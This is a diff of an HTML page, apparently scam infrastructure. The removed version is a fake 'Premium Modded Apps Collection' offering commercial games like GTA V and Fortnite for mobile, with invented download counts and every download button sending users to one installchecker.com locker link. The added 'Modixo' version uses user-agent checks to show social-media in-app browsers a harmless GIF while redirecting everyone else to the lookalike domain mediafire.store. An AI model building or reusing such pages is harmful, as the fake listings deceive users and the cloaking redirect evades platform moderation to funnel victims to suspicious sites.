@@ -1,485 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>Premium Modded Apps Collection</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    :root {
-      --main-blue: #2196f3;
-      --main-blue2: #1769aa;
-      --main-blue-glow: #6ec6ff;
-      --dark-bg: #101010;
-      --card-bg: #181c23;
-      --white: #fff;
-      --radius: 22px;
-    }
-    body {
-      margin: 0;
-      background: var(--dark-bg);
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background: linear-gradient(120deg, #101010 70%, #1a3142 100%);
-      min-height: 100vh;
-    }
-    .header {
-      width: 100%;
-      padding: 10px 0 16px 0;
-      background: rgba(33,150,243,0.44);
-      display: flex;
-      align-items: flex-start;
-      box-shadow: 0 2px 18px 0 rgba(33,150,243,0.13);
-      z-index: 3;
-      position: relative;
-    }
-    .logo-wrap {
-      margin-left: 18px;
-      display: flex;
-      flex-direction: column;
-      align-items: flex-start;
-      gap: 2px;
-    }
-    .main-logo {
-      width: 48px;
-      height: 48px;
-      border-radius: 50%;
-      object-fit: cover;
-      box-shadow: 0 1px 6px 0 rgba(0,0,0,.13);
-      border: 2.5px solid var(--main-blue);
-      background: #fff;
-    }
-    .header-title {
-      margin-top: 4px;
-      margin-left: 2px;
-      padding: 4px 12px 4px 10px;
-      border-radius: 0 0 11px 11px;
-      background: rgba(33,150,243,0.53);
-      color: var(--white);
-      font-weight: 500;
-      font-size: 1.07rem;
-      letter-spacing: 0.4px;
-      box-shadow: 0 1px 6px 0 rgba(0,0,0,0.10);
-      user-select: none;
-    }
-    /* بطاقة PPSSPP */
-    .ppsspp-header-card {
-      position: absolute;
-      top: 8px;
-      right: 22px;
-      width: 48px;
-      height: 48px;
-      background: linear-gradient(130deg, #2162f3 70%, #1ec7e6 100%);
-      border-radius: 50%;
-      box-shadow: 0 2px 16px #2196f333, 0 1px 8px #000b;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      z-index: 12;
-      transition: box-shadow .19s, transform .18s;
-      border: 2.5px solid #fff;
-      overflow: hidden;
-    }
-    .ppsspp-header-card:hover {
-      box-shadow: 0 4px 32px #1ec7e677, 0 2px 18px #2196f399;
-      transform: scale(1.09) rotate(-1deg);
-    }
-    .ppsspp-header-card img {
-      width: 32px;
-      height: 32px;
-      object-fit: contain;
-      pointer-events: none;
-      user-select: none;
-    }
-    @media (max-width:600px) {
-      .main-logo { width: 35px; height: 35px; border-width: 1.5px; }
-      .ppsspp-header-card {
-        width: 35px;
-        height: 35px;
-        top: 7px;
-        right: 8px;
-        border-width: 1.5px;
-      }
-      .ppsspp-header-card img { width: 21px; height: 21px; }
-      .header-title { font-size: 0.85rem; }
-      .logo-wrap { margin-left: 8px; }
-    }
-    .games-grid {
-      display: grid;
-      gap: 34px 24px;
-      padding: 54px 6vw;
-      justify-content: center;
-      background: none;
-    }
-    @media (max-width: 700px) {
-      .games-grid {
-        grid-template-columns: repeat(2, 1fr);
-        gap: 18px 8px;
-        padding: 22px 3vw;
-      }
-    }
-    @media (min-width: 701px) {
-      .games-grid {
-        grid-template-columns: repeat(4, 1fr);
-      }
-    }
-    .game-card {
-      background: var(--card-bg);
-      border-radius: var(--radius);
-      box-shadow: 0 6px 34px 0 #2196f335, 0 2px 12px 0 #000b;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      align-items: stretch;
-      min-height: 320px;
-      outline: 1.2px solid #222a36;
-      transition: box-shadow .22s, transform .18s, outline .18s;
-      position: relative;
-      cursor: pointer;
-      animation: fadeIn .7s cubic-bezier(.3,0,.2,1);
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.98) translateY(30px);}
-      to { opacity: 1; transform: none;}
-    }
-    .game-card:hover {
-      box-shadow: 0 18px 56px 0 #2196f355, 0 8px 28px #000a;
-      outline: 1.7px solid var(--main-blue);
-      transform: translateY(-7px) scale(1.03);
-    }
-    .game-img-wrap {
-      width: 100%;
-      aspect-ratio: 1/1;
-      background: linear-gradient(120deg, #222b3b 70%, #2196f3 100%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-      border-radius: var(--radius) var(--radius) 0 0;
-      box-shadow: 0 1px 12px #2196f315;
-      position: relative;
-    }
-    .game-img {
-      width: 88%;
-      aspect-ratio: 1/1;
-      object-fit: cover;
-      border-radius: 18px;
-      box-shadow: 0 2px 16px #2196f375;
-      margin: 0;
-      background: #191919;
-      border: 2.5px solid #1a3142;
-      transition: box-shadow .22s;
-    }
-    .game-card:hover .game-img {
-      box-shadow: 0 8px 32px #2196f3cc, 0 2px 16px #000c;
-      border-color: var(--main-blue-glow);
-    }
-    .game-title {
-      color: #fff;
-      font-size: 1.13rem;
-      font-weight: bold;
-      text-align: center;
-      margin: 0;
-      padding: 14px 8px 3px 8px;
-      letter-spacing: 0.23px;
-      line-height: 1.3em;
-      text-shadow: 0 1px 6px #0004;
-      min-height: 2.2em;
-      transition: color .14s;
-    }
-    .game-card:hover .game-title {
-      color: #90cafe;
-    }
-    .game-info-row {
-      color: #8db7e8;
-      font-size: 0.97rem;
-      text-align: center;
-      margin: 0 0 9px 0;
-      opacity: 0.88;
-      display: flex;
-      justify-content: space-around;
-      gap: 7px;
-      font-weight: 500;
-    }
-    .game-bottom {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-top: auto;
-      padding: 0 13px 11px 13px;
-      width: 100%;
-      background: none;
-      min-height: 49px;
-    }
-    .platforms {
-      display: flex;
-      gap: 4px;
-      align-items: center;
-    }
-    .platform-icon {
-      width: 21px;
-      height: 21px;
-      opacity: 0.9;
-      filter: drop-shadow(0 0 7px #2196f3a1);
-      transition: filter .16s, transform .15s;
-    }
-    .game-card:hover .platform-icon {
-      filter: drop-shadow(0 0 14px #2196f3cc);
-      transform: scale(1.11);
-    }
-    .open-btn {
-      background: linear-gradient(90deg, #2196f3 70%, #1769aa 100%);
-      color: #fff;
-      border: none;
-      border-radius: 11px;
-      padding: 10px 24px;
-      font-size: 1.09rem;
-      font-weight: bold;
-      letter-spacing: 0.2px;
-      cursor: pointer;
-      margin-left: 3px;
-      box-shadow: 0 2px 11px 0 #2196f329;
-      transition: background 0.16s, box-shadow 0.15s, transform 0.14s;
-    }
-    .open-btn:hover {
-      background: linear-gradient(90deg, #1769aa 70%, #2196f3 100%);
-      box-shadow: 0 5px 16px #2196f399;
-      transform: scale(1.07);
-    }
-
-    /* Modal */
-    .modal-bg {
-      position: fixed; top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(0,0,0,0.84);
-      z-index: 999;
-      display: flex; align-items: center; justify-content: center;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity .18s;
-    }
-    .modal-bg.active {
-      opacity: 1;
-      pointer-events: auto;
-    }
-    .modal-content {
-      background: #181c23;
-      border-radius: 18px;
-      box-shadow: 0 2px 32px 0 #2196f336;
-      padding: 22px 13px 18px 13px;
-      width: 92vw;
-      max-width: 370px;
-      position: relative;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      animation: modalIn .18s cubic-bezier(.4,0,.2,1);
-    }
-    @keyframes modalIn {
-      from { transform: translateY(30px) scale(.96); opacity: .55; }
-      to { transform: none; opacity: 1; }
-    }
-    .close-modal {
-      position: absolute; right: 13px; top: 8px;
-      font-size: 1.4rem;
-      background: none; border: none;
-      color: #cfd8dc;
-      cursor: pointer;
-      transition: color .18s;
-      font-weight: bold;
-      z-index: 2;
-    }
-    .close-modal:hover { color: var(--main-blue); }
-    .cover-img {
-      width: 98%; min-height: 86px; max-height: 144px;
-      object-fit: cover;
-      border-radius: 11px;
-      margin-bottom: 10px;
-      background: #222;
-      box-shadow: 0 1px 10px 0 #2196f32a;
-    }
-    .modal-title {
-      color: #fff;
-      font-size: 1.11rem;
-      font-weight: bold;
-      text-align: center;
-      margin-bottom: 3px;
-    }
-    .modal-desc {
-      color: #b9c5d7;
-      text-align: center;
-      margin: 5px 0 5px 0;
-      font-size: 0.97rem;
-      min-height: 36px;
-    }
-    .modal-info {
-      display: flex;
-      justify-content: space-between;
-      width: 97%;
-      margin: 5px 0 10px 0;
-      font-size: 0.98rem;
-      color: #2196f3;
-      font-weight: bold;
-    }
-    .modal-download {
-      background: #2196f3;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      padding: 11px 0;
-      font-size: 1.09rem;
-      font-weight: bold;
-      width: 100%;
-      cursor: pointer;
-      margin-top: 4px;
-      transition: background .18s, box-shadow 0.15s, transform .16s;
-      box-shadow: 0 1px 8px 0 #2196f32a;
-    }
-    .modal-download:hover {
-      background: #1769aa;
-      box-shadow: 0 4px 18px 0 #2196f399;
-      transform: scale(1.04);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modixo</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
 </head>
 <body>
-  <!-- بطاقة PPSSPP أعلى يمين الهيدر -->
-  <div class="ppsspp-header-card" onclick="window.location.href='ppsspp.html'" title="ألعاب PPSSPP">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/PPSSPP_logo.svg/1200px-PPSSPP_logo.svg.png" alt="PPSSPP Logo">
-  </div>
-  <!-- Header -->
-  <div class="header">
-    <div class="logo-wrap">
-      <img src="https://i.postimg.cc/8k0Bvx2n/bf63d212-acd6-4471-ab5d-a41c0961fc43.jpg" class="main-logo" alt="Logo">
-      <div class="header-title">Premium Modded Apps Collection</div>
-    </div>
-  </div>
-  <!-- Games Grid -->
-  <div class="games-grid" id="gamesGrid"></div>
-  <!-- Modal -->
-  <div class="modal-bg" id="modalBg">
-    <div class="modal-content" id="modalContent">
-      <button class="close-modal" id="closeModalBtn">&times;</button>
-      <img src="" alt="Game Cover" class="cover-img" id="modalCover">
-      <div class="modal-title" id="modalTitle"></div>
-      <div class="modal-desc" id="modalDesc"></div>
-      <div class="modal-info">
-        <span id="modalSize"></span>
-        <span id="modalDownloads"></span>
-      </div>
-      <button class="modal-download" id="modalDownloadBtn">Download</button>
-    </div>
-  </div>
-  <!-- SVG Icons (hidden) -->
-  <svg style="display:none">
-    <symbol id="android-logo" viewBox="0 0 32 32">
-      <circle cx="16" cy="16" r="16" fill="#73e23c"/>
-      <path d="M10 19v-6a6 6 0 0112 0v6" fill="#fff"/>
-      <circle cx="13" cy="22" r="2" fill="#fff"/>
-      <circle cx="19" cy="22" r="2" fill="#fff"/>
-    </symbol>
-    <symbol id="apple-logo" viewBox="0 0 32 32">
-      <path fill="#fff" d="M24.9 17.4c0-4.3 3.5-6.4 3.7-6.5-2-2.9-5.1-3.3-6.2-3.3-2.6-.3-5.1 1.5-6.3 1.5-1.3 0-3.3-1.5-5.4-1.5-2.8 0-5.4 1.7-6.9 4.3-3 5.2-.8 12.9 2.2 17.2 1.4 2 3.1 4.2 5.3 4.1 2.1-.1 3-1.3 5.6-1.3 2.6 0 3.3 1.3 5.5 1.2 2.3 0 3.8-2 5.2-4 .9-1.3 1.3-2 2-3.5-5.2-2-6.1-7.2-6.1-7.4zm-5.9-13.5c1.2-1.4 2.1-3.3 1.9-5.2-1.9.1-4.1 1.3-5.4 2.7-1.1 1.3-2.2 3.2-1.8 5.1 2.1.2 4.1-1.1 5.3-2.6z"/>
-    </symbol>
-  </svg>
-  <script>
-    const games = [
-      {
-        title: "Red Dead Redemption 2",
-        logo: "https://xboxwire.thesourcemediaassets.com/sites/2/2020/05/RDR2.jpg",
-        cover: "https://i.pinimg.com/736x/4f/44/bf/4f44bf0259b481ca82aa280506f57c3b.jpg",
-        desc: "An epic tale of life in America at the dawn of the modern age. Immersive open world and gripping story.",
-        size: "15.2 GB",
-        downloads: "10.7M",
-        platforms: ["android", "iphone"]
-      },
-      { title: "Persona 5 The Phantom X", logo: "https://upload.wikimedia.org/wikipedia/en/d/d2/Persona_5X_app_icon.png", cover: "https://m.media-amazon.com/images/M/MV5BYzA4ZDdmNjctMDljOC00NThlLTk5MzYtZDRkZjRkMjFiMTg5XkEyXkFqcGc@._V1_.jpg", desc: "A new adventure in the Persona franchise with stunning JRPG action and intrigue.", size: "2.3 GB", downloads: "7.1M", platforms: ["android", "iphone"] },
-      { title: "Jet Set Radio", logo: "https://upload.wikimedia.org/wikipedia/en/7/7b/Jetsetradiopalboxart.jpg", cover: "https://m.media-amazon.com/images/M/MV5BMzlhMmE0MmQtNGU3YS00NDIxLTgyZjItOWVkNjI5OTMxYTIzXkEyXkFqcGc@._V1_.jpg", desc: "Classic rollerblading action and graffiti art in a futuristic city.", size: "1.4 GB", downloads: "5.2M", platforms: ["android", "iphone"] },
-      { title: "Once Human Mobile", logo: "https://i.postimg.cc/DzRZTW4V/IMG-20250905-133351.jpg", cover: "https://i.postimg.cc/SxvQ6XrX/ohn-wmg.jpg", desc: "Survive, explore, and fight in a post-apocalyptic world filled with monsters.", size: "3.1 GB", downloads: "9.6M", platforms: ["android", "iphone"] },
-      { title: "Fortnite Mobile", logo: "https://upload.wikimedia.org/wikipedia/commons/7/7c/Fortnite_F_lettermark_logo.png", cover: "https://cdn2.unrealengine.com/evergreen-key-1920x1080-8e5f1700eda5.jpg", desc: "Battle Royale sensation with cross-platform play and creative modes.", size: "11.2 GB", downloads: "15.3M", platforms: ["android", "iphone"] },
-      { title: "GTA V Mobile", logo: "https://i.postimg.cc/L5hySQ7v/9a77db0d3793bb8c4170658776d948c8.jpg", cover: "https://m.media-amazon.com/images/M/MV5BMjEwNDk3OTYxMF5BMl5BanBnXkFtZTcwMjA2ODU5OQ@@._V1_.jpg", desc: "Experience Los Santos on mobile with iconic open-world gameplay.", size: "7.8 GB", downloads: "14.1M", platforms: ["android", "iphone"] },
-      { title: "eFootball 2025", logo: "https://i.postimg.cc/MKfnMbJL/unnamed-1.webp", cover: "https://efootballchampionship.konami.net/media/items/014_efootball_championship-open_1200x600.jpg", desc: "Compete in the most realistic football simulation for mobile.", size: "2.6 GB", downloads: "12.7M", platforms: ["android", "iphone"] },
-      { title: "FC25", logo: "https://i.postimg.cc/JtCMBXbw/18e08f7058c02b5c6de336b928d91ec214d839c76e188acb923659c0cc0ecb32-200.jpg", cover: "https://www.lequipe.fr/_medias/img-photo-jpg/jude-bellingham-a-ete-choisi-pour-occuper-la-jaquette-d-ea-sports/1500000002054777/0:0,1685:1124-828-552-75/08a01.jpg", desc: "The next-gen football experience, now optimized for mobile play.", size: "4.2 GB", downloads: "8.4M", platforms: ["android", "iphone"] },
-      { title: "One Punch Man - The Strongest", logo: "https://i.postimg.cc/pdcGCFcF/unnamed.jpg", cover: "https://assets-prd.ignimgs.com/2022/09/15/article-header-image-1663259982491.jpg", desc: "Enter the anime universe with Saitama and epic heroes in turn-based battles.", size: "1.1 GB", downloads: "6.8M", platforms: ["android", "iphone"] },
-      { title: "NBA 2k25 MyTeam", logo: "https://i.postimg.cc/CL26J0t1/679842fb5d226-com-t2ksports-myteam2k25.png", cover: "https://videoludos.fr/wp-content/uploads/2025/06/N25-BASE-STANDARD_EDITION_ANNOUNCE-NA-STATIC-ESRB-AGN-1920x1080-1.jpg", desc: "Build your basketball dream team and dominate the courts.", size: "2.4 GB", downloads: "5.9M", platforms: ["android", "iphone"] },
-      { title: "Mobile Legends - Bang Bang", logo: "https://i.postimg.cc/R052ff8V/mobilelegends-1696089976653.jpg", cover: "https://cdn.prod.website-files.com/65956e2711516206d2d1258f/67d16acac5515372f3f3af70_MLBB%20rank%20cover.jpeg", desc: "Classic 5v5 MOBA action for fast-paced multiplayer battles.", size: "3.0 GB", downloads: "22.4M", platforms: ["android", "iphone"] },
-      { title: "Baseball 9", logo: "https://i.postimg.cc/8zPDtNM2/baseball9.png", cover: "https://inreviewcritics.com/wp-content/uploads/2021/09/baseball-9.jpg?w=1024", desc: "Enjoy realistic baseball with simple controls and deep gameplay.", size: "0.9 GB", downloads: "5.6M", platforms: ["android", "iphone"] },
-      { title: "Game Of Thrones: Kingsroad", logo: "https://i.postimg.cc/hvjSBgcw/gotkingsroad-1734066388113.jpg", cover: "https://i.postimg.cc/5NDfZZG7/game-of-thrones-kingsroad-16khf.jpg", desc: "Rule Westeros in this epic Game of Thrones mobile RPG.", size: "2.0 GB", downloads: "8.2M", platforms: ["android", "iphone"] },
-      { title: "Swordash", logo: "https://i.postimg.cc/gkzhx62F/unnamed.jpg", cover: "https://i.postimg.cc/CMNBpLHv/maxresdefault-1.jpg", desc: "Dash through enemies in action-packed sword battles.", size: "1.3 GB", downloads: "6.7M", platforms: ["android", "iphone"] },
-      { title: "Glory Ages - Samurais", logo: "https://i.postimg.cc/66n3B6Vs/unnamed-5.png", cover: "https://i.postimg.cc/fb1zh1JT/maxresdefault.jpg", desc: "Experience the age of samurai with strategic duels and epic fights.", size: "1.0 GB", downloads: "5.3M", platforms: ["android", "iphone"] },
-      { title: "Takashi Ninja Warrior", logo: "https://i.postimg.cc/X7nV3f7F/81by-kf5na-L.png", cover: "https://i.postimg.cc/xTg9dXcZ/81mp3x-AY4-PL.jpg", desc: "Become a legendary ninja in this action-packed RPG adventure.", size: "1.2 GB", downloads: "5.8M", platforms: ["android", "iphone"] },
-      { title: "GTA San Andreas", logo: "https://i.postimg.cc/v86q0krH/unnamed-3.png", cover: "https://cdn2.unrealengine.com/egs-grandtheftautosanandreasthedefinitiveedition-rockstargames-g1a-00-1920x1080-db31e491c234.jpg", desc: "The legendary open-world crime game, now on your mobile device.", size: "4.5 GB", downloads: "13.7M", platforms: ["android", "iphone"] },
-      { title: "Bully", logo: "https://i.postimg.cc/Bn1NW1TH/unnamed-8.png", cover: "https://media.rockstargames.com/rockstargames-newsite/uploads/db587015371f4fe4bd88ab63c50141f0c5f1ecec.jpg", desc: "Fight, prank, and survive school life in this Rockstar classic.", size: "2.2 GB", downloads: "5.4M", platforms: ["android", "iphone"] },
-      { title: "Roblox", logo: "https://i.postimg.cc/gJx34khh/unnamed.webp", cover: "https://m.media-amazon.com/images/M/MV5BZTE3MjQwMmItNjkwYS00ZTBjLWI1MzQtYThiNGM0NWI0ZmQ4XkEyXkFqcGc@._V1_.jpg", desc: "Play and create with millions of immersive worlds and games.", size: "2.9 GB", downloads: "25.2M", platforms: ["android", "iphone"] },
-      { title: "GTA Vice City", logo: "https://i.postimg.cc/6pRVbxKh/unnamed-6.png", cover: "https://jeux.ca/wp-content/uploads/2024/05/GTA-Vice-City-featured.jpg", desc: "Relive the 80s in neon-soaked Vice City on mobile.", size: "2.0 GB", downloads: "7.2M", platforms: ["android", "iphone"] },
-      { title: "Minecraft", logo: "https://i.postimg.cc/tJ0n5dp0/unnamed-3.png", cover: "https://www.minecraft.net/content/dam/minecraftnet/games/dungeons/key-art/Downloads_Box-Art_Dungeons_600x337.jpg", desc: "Build, mine, and survive in the limitless creative sandbox.", size: "0.7 GB", downloads: "30.8M", platforms: ["android", "iphone"] },
-      { title: "GTA III", logo: "https://i.postimg.cc/J76QGQKj/unnamed-7.png", cover: "https://cdn1.epicgames.com/offer/ec64a50e79884e28be9ac3d3cd4f5c12/EGS_GrandTheftAutoIIITheDefinitiveEdition_RockstarGames_S1_2560x1440-5e44468c38f50805cac5ab47748d7b79", desc: "The classic crime saga that changed open-world gaming forever.", size: "1.6 GB", downloads: "6.2M", platforms: ["android", "iphone"] }
-    ];
-    const platformSVG = {
-      android: `<svg class="platform-icon"><use href="#android-logo"/></svg>`,
-      iphone: `<svg class="platform-icon"><use href="#apple-logo"/></svg>`
-    };
-    const grid = document.getElementById('gamesGrid');
-    games.forEach((game, idx) => {
-      const card = document.createElement('div');
-      card.className = "game-card";
-      card.innerHTML = `
-        <div class="game-img-wrap"><img src="${game.logo}" class="game-img" alt="${game.title}"></div>
-        <div class="game-title">${game.title}</div>
-        <div class="game-info-row">
-          <span>${game.size}</span>
-          <span>${game.downloads} downloads</span>
-        </div>
-        <div class="game-bottom">
-          <div class="platforms">
-            ${game.platforms.map(p => platformSVG[p]).join('')}
-          </div>
-          <button class="open-btn" data-idx="${idx}">OPEN</button>
-        </div>
-      `;
-      grid.appendChild(card);
-    });
-    // Modal
-    const modalBg = document.getElementById('modalBg');
-    const modalCover = document.getElementById('modalCover');
-    const modalTitle = document.getElementById('modalTitle');
-    const modalDesc = document.getElementById('modalDesc');
-    const modalSize = document.getElementById('modalSize');
-    const modalDownloads = document.getElementById('modalDownloads');
-    const modalDownloadBtn = document.getElementById('modalDownloadBtn');
-    let modalOpenIdx = null;
-    grid.addEventListener('click', e => {
-      const btn = e.target.closest('.open-btn');
-      if (!btn) return;
-      const idx = +btn.dataset.idx;
-      const game = games[idx];
-      modalOpenIdx = idx;
-      modalCover.src = game.cover;
-      modalTitle.textContent = game.title;
-      modalDesc.textContent = game.desc;
-      modalSize.textContent = `Size: ${game.size}`;
-      modalDownloads.textContent = `${game.downloads} downloads`;
-      modalDownloadBtn.onclick = () => window.open("https://installchecker.com/cl/v/7j7n9v", "_blank");
-      modalBg.classList.add('active');
-    });
-    document.getElementById('closeModalBtn').onclick = () => {
-      modalBg.classList.remove('active');
-      setTimeout(() => {
-        modalCover.src = "";
-        modalTitle.textContent = "";
-        modalDesc.textContent = "";
-        modalSize.textContent = "";
-        modalDownloads.textContent = "";
-        modalOpenIdx = null;
-      }, 170);
-    };
-    modalBg.onclick = e => {
-      if (e.target === modalBg) document.getElementById('closeModalBtn').onclick();
-    };
-    window.addEventListener('keydown', e => {
-      if (e.key === "Escape" && modalBg.classList.contains('active')) {
-        document.getElementById('closeModalBtn').onclick();
-      }
-    });
-  </script>
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHhFZmTqAWzpDPDT2dYxwua6wth-C6N807IjtpNv19snj-rPEz8S0RFqfP6faxsdap6U3fYApuzw_Bx0o1zxAbQdBcxzCfs3HiqqGxYYrh0EAod56xb0azao7h0w1Oht4slFmaJcyINo53xyccAoJdn6VlRzrQz357u3SBa1-lsdTzgHYw0dre1v7m/s1920/Untitled%20Project.gif" alt="Image">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
+    <script>
+        function isSocialMediaBrowser() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            const socialMediaPatterns = [
+                /Instagram/i,
+                /Snapchat/i,
+                /FBAN/i, // Facebook App
+                /FBAV/i, // Facebook App
+                /Twitter/i,
+                /TikTok/i,
+                /Musical.ly/i // TikTok's previous name
+            ];
+
+            // Checking using patterns
+            const isSocialMedia = socialMediaPatterns.some(pattern => pattern.test(userAgent));
+
+            return isSocialMedia;
+        }
+
+        function redirectToLink() {
+            window.location.href = 'https://mediafire.store/'; // رابط التحويل
+        }
+
+        // Check if the user is not using a social media browser
+        if (!isSocialMediaBrowser()) {
+            redirectToLink();
+        }
+    </script>
 </body>
 </html>
